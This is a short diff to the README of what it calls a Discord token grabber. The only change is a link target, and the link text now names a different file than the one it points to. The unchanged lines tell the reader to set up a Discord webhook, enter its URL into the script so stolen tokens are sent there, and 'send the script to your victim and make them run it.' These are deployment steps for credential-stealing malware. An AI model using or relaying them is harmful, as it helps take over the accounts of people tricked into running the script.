@@ -18,7 +18,7 @@
 
 # How to use
  1. Create a webhook on your Discord server. I recommend creating a new server.
- 2. Change the 'WEBHOOK_URL' variable value in line 184 to your Discord webhook URL in [token_grabber.py](token_grabber.py).
+ 2. Change the 'WEBHOOK_URL' variable value in line 184 to your Discord webhook URL in [token_grabber.py](discord_grabber.py).
  3. Send the script to your victim and make them run it.
 
 # Caution
